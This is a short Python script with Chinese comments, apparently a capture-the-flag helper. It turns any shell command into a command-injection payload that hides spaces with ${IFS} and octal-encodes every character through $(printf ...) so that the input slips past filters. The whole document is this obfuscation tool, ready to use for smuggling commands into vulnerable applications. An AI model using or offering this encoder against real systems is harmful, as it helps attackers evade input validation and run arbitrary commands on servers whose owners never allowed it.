# ${IFS}代替空格
# $(printf '八进制表示')绕过过滤

s = input('请输入命令：')
print('$(printf${IFS}"', end='')
for ele in s:
    print('\\' + oct(ord(ele))[2:], end='')
print('")')